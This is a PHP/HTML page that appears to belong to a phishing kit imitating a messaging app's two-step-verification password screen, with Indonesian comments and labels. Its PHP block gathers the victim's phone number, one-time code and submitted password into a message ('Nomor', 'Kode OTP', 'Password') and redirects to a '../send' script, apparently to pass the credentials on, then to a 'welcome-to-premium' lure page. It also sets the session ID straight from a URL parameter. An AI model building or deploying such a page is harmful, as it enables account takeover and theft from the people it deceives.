<?php
session_id($_GET['sid']);
session_start();

if (isset($_POST['submit3'])) {
    $phoneNumber = $_SESSION['phoneNumber'];
    $kodeOtp = $_SESSION['codeotp'];
    $pass = $_POST['pass'];
    $_SESSION['returnUrl'] = "location: ../welcome-to-premium";
    $_SESSION['msg'] = "Nomor: $phoneNumber\nKode OTP: $kodeOtp\nPassword: $pass\n- - - - -";
    
    header("location: ../send?sid=" . session_id());

}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Password</title>
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
    <style>
        .gambar{
            width: 165x;
            height: 165px;
            margin-top: 1.3cm;
            background-size: cover;
        }
        h2{
            background-size:cover;
            transform: translateY(900%);
        }
        p{
            margin-top: 290px;
            
        }
        form{
            margin-top:400px;
            
        }
        #toggle{
            position: absolute;
            top: 50%;
            right: 20px;
            transform: translateY(-50%);
            width: 30px;
            height: 30px;
            background: url(../verifshop/show.png);
            background-size: cover;
            cursor: pointer;
        }
        #toggle.hide{
            background: url(../verifshop/hide.png);
            background-size: cover;
        }
        #toggle1{
            
            transform: translateY(-50%);
            width: 165px;
            height: 165px;
            background: url(monkey1.png);
            background-size: cover;
            margin-top: -350px;
            
        }
        #toggle1.hides{
            background: url(monkey2.png);
            background-size: cover;
        }
        .password-floating {
            position: relative;
            margin-bottom: 20px;
          }
          
          .password-floating label {
            position: absolute;
            top: 10px;
            left: 10px;
            font-size: 17px;
            color: #aaa;
            
            transition: all 0.2s ease-in-out;
            transform-origin: top left;
            pointer-events: none;
          }
          
          .password-floating input {
            font-size: 16px;
            padding: 12px 12px 12px 10px;
            display: block;
            border: 1px solid #dfdede; /* menambahkan border */
            border-radius: 5px; /* menambahkan border-radius */
            width: 350px;
            height: 50px;
            background: transparent;
          }
          
          .password-floating input:focus {
            outline: none;
            border: 2px solid #2f80ed;
            border-radius: 5px;
          }
          
          .password-floating input:focus + label{
            transform: translateY(-20px) scale(0.8);
            color: #2f80ed;
            background: white;
            width: 285px;
            font-weight: bold;
            text-align: center;
          }
          .password-floating input:placeholder-shown + label {
            transform: translateY(-20px) scale(0.8);
            color: #2f80ed;
            background: white;
            width: 285px;
            font-weight: bold;
            text-align: center;
          }
          
          .password-floating label.active {
            transform: translateY(-20px) scale(0.8);
            color: #2f80ed;
            background: white;
            width: 285px;
            font-weight: bold;
            text-align: center;
          }
          .button {
            background-color: #2a89ef;
            border: none;
            color: white;
            padding: 15px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 14px;
            font-weight: bold;
            width: 350px;
          }
          .button1 {border-radius: 8px;}
          .center{
              text-align:center;
              
              
          }
    </style>
</head>
  <body>
    <div class="container-md">
        <div class="position-relative">
           <!--<div class="position-absolute top-0 start-50 translate-middle-x">
                <img src="monkey1.png" class="gambar" alt="" srcset="">
            </div> -->
            <div class="position-absolute top-0 start-50 translate-middle-x">
    
            </div>
            <div class="center">
                <h2>Enter Your Password</h2>
            </div>
            <div>
                <p class="text-center text-body-secondary">Your account is protected with<br>
                    an additional password</p>
            </div>
            <div class="position-absolute top-0 start-50 translate-middle-x">
                <form action="" method="post" onsubmit="loadd();">                    
                    <!--<div class="form-floating">
                        <input type="password" class="form-control" id="floatingPassword" placeholder="Password">
                        <label for="floatingPassword">Password</label>
                        <div id="toggle" onclick="showHide();"></div>
                    </div>-->
                    <div class="password-floating">
                        <input name="pass" type="password" placeholder="" id="password" />
                        <label for="password">Do you have password? input here</label>
                        <div id="toggle" onclick="showHide();"></div>
                        <div id="toggle1" class="position-absolute top-0 start-50 translate-middle-x" onclick="showHide();"></div>
                    </div>
                    <button name="submit3" type="submit" class="button button1">NEXT</button>
                      
                </form>

            </div>
            
              
              
            
        </div>
    </div>
    
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="assets/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script>
    <script>
        const toggle = document.getElementById('toggle');
        const toggle1 = document.getElementById('toggle1');
        const input = document.getElementById("password");
        const label = document.querySelector("label[for='password']");
        
        
        input.addEventListener("input", () => {
            if (input.value.length > 0) {
                label.classList.add("active");
                input.setAttribute("placeholder", "");
            } else {
                label.classList.remove("active");
                input.setAttribute("placeholder", " ");
            }
        });
        
        function showHide(){
            if(password.type === 'password'){
                password.setAttribute('type', 'text');
                toggle.classList.add('hide');
                toggle1.classList.add('hides');
                password.style.border = '2px solid #2f80ed';
            } else{
                password.setAttribute('type', 'password');
                toggle.classList.remove('hide');
                toggle1.classList.remove('hides');
                password.style.border = '2px solid #2f80ed';
            }
        }
        
    </script>
  </body>
</html>